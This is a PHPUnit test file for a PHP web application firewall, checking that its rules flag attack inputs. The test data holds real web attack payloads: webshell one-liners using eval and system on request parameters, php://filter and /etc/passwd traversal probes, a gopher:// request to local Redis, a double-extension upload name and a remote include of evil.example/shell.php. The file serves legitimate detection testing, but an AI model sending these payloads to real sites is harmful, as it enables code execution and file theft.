<?php

use Fireline\Engine\FieldInspector;
use Fireline\Extract\RequestField;
use Fireline\Normalize\Normalizer;
use Fireline\Scoring\Thresholds;
use PHPUnit\Framework\TestCase;

class ExpandedRuleCoverageTest extends TestCase
{
    public function testBlocksPhpStreamFilterProbeAtLowParanoia(): void
    {
        $result = $this->inspect('get.file', 'file=php://filter/convert.base64-encode/resource=index.php', 'low');

        $this->assertGreaterThanOrEqual(35, $result->score());
        $this->assertContains('PHP_STREAM_FILTER', array_column($result->toArray()['matches'], 'id'));
    }

    public function testBlocksScannerFingerprintAtMediumParanoia(): void
    {
        $result = $this->inspect('header.User-Agent', 'sqlmap/1.8', 'medium', 'header');

        $this->assertGreaterThanOrEqual(25, $result->score());
        $this->assertContains('SCANNER_SQLMAP', array_column($result->toArray()['matches'], 'id'));
    }

    public function testBlocksNiktoScannerFingerprintAtMediumParanoia(): void
    {
        $result = $this->inspect('header.User-Agent', 'Nikto/2.5.0', 'medium', 'header');

        $this->assertGreaterThanOrEqual(25, $result->score());
        $this->assertContains('SCANNER_NIKTO', array_column($result->toArray()['matches'], 'id'));
    }

    public function testBlocksWebshellEvalPostAtHighParanoia(): void
    {
        $result = $this->inspect('post.code', '<?php eval($_POST["cmd"]); ?>', 'high');

        $this->assertGreaterThanOrEqual(18, $result->score());
        $this->assertContains('WEBSHELL_EVAL_POST_CALL', array_column($result->toArray()['matches'], 'id'));
    }

    public function testBlocksWebshellSystemGetAtHighParanoia(): void
    {
        $result = $this->inspect('post.code', '<?php system($_GET["cmd"]); ?>', 'high');

        $this->assertGreaterThanOrEqual(18, $result->score());
        $this->assertContains('WEBSHELL_SYSTEM_GET_CALL', array_column($result->toArray()['matches'], 'id'));
    }

    public function testBlocksBoundedTraversalToSensitiveFiles(): void
    {
        $result = $this->inspect('get.file', 'file=../../../../etc/passwd', 'medium');
        $benign = $this->inspect('get.path', 'path=../docs/readme.txt', 'medium');

        $this->assertGreaterThanOrEqual(24, $result->score());
        $this->assertContains('LFI_TRAVERSAL_SENSITIVE_FILE', array_column($result->toArray()['matches'], 'id'));
        $this->assertLessThan(25, $benign->score());
    }

    public function testBlocksEncodedTraversalToSensitiveFiles(): void
    {
        $result = $this->inspect('get.file', 'file=%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'medium');

        $this->assertGreaterThanOrEqual(24, $result->score());
        $this->assertContains('LFI_TRAVERSAL_SENSITIVE_FILE', array_column($result->toArray()['matches'], 'id'));
    }

    public function testBlocksPhpAssertSuperglobalInjectionAtHighParanoia(): void
    {
        $probe = $this->inspect('post.code', 'assert($_GET["cmd"])', 'high');
        $benign = $this->inspect('post.note', 'assertiveness matters in documentation', 'high');

        $this->assertGreaterThanOrEqual(18, $probe->score());
        $this->assertContains('PHP_ASSERT_SUPERGLOBAL_CALL', array_column($probe->toArray()['matches'], 'id'));
        $this->assertLessThan(18, $benign->score());
    }

    public function testBlocksGopherProtocolAbuseAtHighParanoia(): void
    {
        $probe = $this->inspect('get.url', 'url=gopher://127.0.0.1:6379/_INFO', 'high');
        $benign = $this->inspect('get.url', 'url=https://example.com/docs', 'high');

        $this->assertGreaterThanOrEqual(18, $probe->score());
        $this->assertContains('PROTOCOL_GOPHER_URL', array_column($probe->toArray()['matches'], 'id'));
        $this->assertLessThan(18, $benign->score());
    }

    public function testBlocksUploadDoubleExtensionEvasion(): void
    {
        $probe = $this->inspect('file.avatar.name', 'avatar.php.jpg', 'medium', 'file');
        $benign = $this->inspect('file.avatar.name', 'avatar.photo.jpg', 'medium', 'file');

        $this->assertGreaterThanOrEqual(25, $probe->score());
        $this->assertContains('UPLOAD_DOUBLE_EXTENSION_SCRIPT', array_column($probe->toArray()['matches'], 'id'));
        $this->assertLessThan(25, $benign->score());
    }

    public function testStrictRemoteFileInclusionRequiresScriptLikeUrl(): void
    {
        $probe = $this->inspect('get.page', 'page=http://evil.example/shell.php', 'strict');
        $benign = $this->inspect('get.return', 'return=http://example.com/docs', 'strict');

        $this->assertGreaterThanOrEqual(12, $probe->score());
        $this->assertContains('RFI_REMOTE_SCRIPT', array_column($probe->toArray()['matches'], 'id'));
        $this->assertLessThan(12, $benign->score());
    }

    protected function inspect(string $name, string $value, string $paranoia, string $source = 'get')
    {
        $thresholds = new Thresholds(['paranoia_level' => $paranoia]);
        $field = new RequestField($name, $value, $source);

        return (new FieldInspector($thresholds))->inspect(
            ['method' => 'GET', 'route' => '/demo'],
            $field,
            (new Normalizer())->run($value),
            false
        );
    }
}
